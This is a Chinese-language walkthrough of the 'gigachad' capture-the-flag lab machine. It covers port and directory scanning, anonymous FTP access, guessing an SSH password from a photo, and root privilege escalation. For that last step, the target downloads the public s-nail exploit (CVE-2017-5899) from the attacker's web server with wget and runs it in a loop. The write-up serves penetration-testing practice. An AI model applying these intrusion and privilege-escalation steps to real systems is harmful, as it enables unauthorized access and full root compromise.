|   |   |   |
|---|---|---|
|gigachad|easy|ftp利用、google反图搜索、 suid提权、s-nail 提权|

# 主机发现
```c
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ sudo netdiscover -i eth0 -r 192.168.44.138/24
```

# 服务探测
```c
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ sudo nmap -sV -A -T 4 -p- 192.168.44.138 

|_/kingchad.html

```
开放了21，22，80
访问http://192.168.44.138//kingchad.html是一张带字的图，翻译
```c
HELL0? IS IT MI5 OR MI6?
他是谁？是军情五处还是军情六处？

WHATEVER, SOMEONE IS TRYINGTO HACK US
不管怎么说，有人想黑我们

```

# 目录扫描
```css
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ gobuster dir -u http://192.168.44.138/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,png -e

┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ ffuf -u http://192.168.44.138/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200

```
很奇怪，扫描到什么就会出现什么，访问都是同一堆字符

访问首页，右键检查源码，解码后没啥用
```c
A7F9B77C16A3AA80DAA4E378659226F628326A95
D82D10564866FD9B201941BCC6C94022196F8EE8 
[md5在线解密破解,md5解密加密](https://www.cmd5.com/)
fuck you
VIRGIN
```
通过匿名访问获取ftp 权限，里面有一个压缩包
密码：anonymous
get出来，解压出来，得到用户名chad
```c
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ ftp 192.168.44.138 //anonymous

get chadino
unzip chadino
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ cat chadinfo 
why yes,
#######################
username is chad
???????????????????????
password?
!!!!!!!!!!!!!!!!!!!!!!!
go to /drippinchad.png

```
访问http://192.168.44.138/drippinchad.png下载图片
```c
WHY YES, THIS IS MY EAVORITE PLACE TO RELAX

HOW AOULD YOU TELL?
翻译
为什么是的，这是我最喜欢放松的地方

你怎么知道？
```
猜测应该是找这个地方
google搜图，谷歌上找到了这个地方叫maidens tower(处女塔)尝试使用这个地方名作为密码登录ssh 居然真成功了。
密码：maidenstower
```c
┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ ssh chad@192.168.44.138 //maidenstower
chad@gigachad:~$ ls
ftp  user.txt
chad@gigachad:~$ cat user.txt
0FAD8F4B099A26E004376EAB42B6A56A
```

# 提权
[suid提权全解（超细）-CSDN博客](https://blog.csdn.net/qq_51524329/article/details/121865922)
[浅谈linux suid提权 - 先知社区](https://xz.aliyun.com/t/12535?time__1311=mqmhD50KBKDK50Hq4%2BOrxuDAhIYwpPjex)

```c
find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null
```

这有一个 s-nail 文件，查看漏洞库发现低于 14.8.16 的版本存在漏洞。s-nail是右键管理命令
```c
chad@gigachad:~$ find / -perm -u=s -type f -exec ls -al {} \; 2>/dev/null
-rwsr-xr-x 1 root root 436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10104 Jan  1  2016 /usr/lib/s-nail/s-nail-privsep
-rwsr-xr-- 1 root messagebus 51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 63736 Jul 27  2018 /usr/bin/passwd
-rwsr-xr-x 1 root root 51280 Jan 10  2019 /usr/bin/mount
-rwsr-xr-x 1 root root 54096 Jul 27  2018 /usr/bin/chfn
-rwsr-xr-x 1 root root 34888 Jan 10  2019 /usr/bin/umount
-rwsr-xr-x 1 root root 44440 Jul 27  2018 /usr/bin/newgrp
-rwsr-xr-x 1 root root 63568 Jan 10  2019 /usr/bin/su
-rwsr-xr-x 1 root root 84016 Jul 27  2018 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 44528 Jul 27  2018 /usr/bin/chsh
chad@gigachad:~$ s-nail -V
v14.8.6

```

```c
┌──(kali㉿kali)-[~]
└─$ searchsploit s-nail                     
------------------------------------------- ---------------------------------
 Exploit Title                             |  Path
------------------------------------------- ---------------------------------
S-nail < 14.8.16 - Local Privilege Escalat | multiple/local/47172.sh
------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ searchsploit -m multiple/local/47172.sh
  Exploit: S-nail < 14.8.16 - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/47172
     Path: /usr/share/exploitdb/exploits/multiple/local/47172.sh
    Codes: CVE-2017-5899
 Verified: False
File Type: POSIX shell script, ASCII text executable
cp: overwrite '/home/kali/'$'\346\241\214\351\235\242''/OSCP/47172.sh'? 
Copied to: /home/kali/桌面/OSCP/47172.sh

┌──(kali㉿kali)-[~/桌面/OSCP]
└─$ php -S 0.0.0.0:1234
[Thu Apr 18 13:27:20 2024] PHP 8.2.12 Development Server (http://0.0.0.0:1234) started
[Thu Apr 18 13:27:55 2024] 192.168.44.138:40538 Accepted
[Thu Apr 18 13:27:55 2024] 192.168.44.138:40538 [200]: GET /47172.sh
[Thu Apr 18 13:27:55 2024] 192.168.44.138:40538 Closing

```
由于此漏洞利用在竞争条件下起作用,这里执行一次不能直接提权，可以使用加个循环去执行。

```css
chad@gigachad:~$ wget http://192.168.44.128:1234/47172.sh
chmod +x 47172.sh
while true; do ./47172.sh ;done


# cat /root/root.txt
832B123648707C6CD022DD9009AEF2FD
```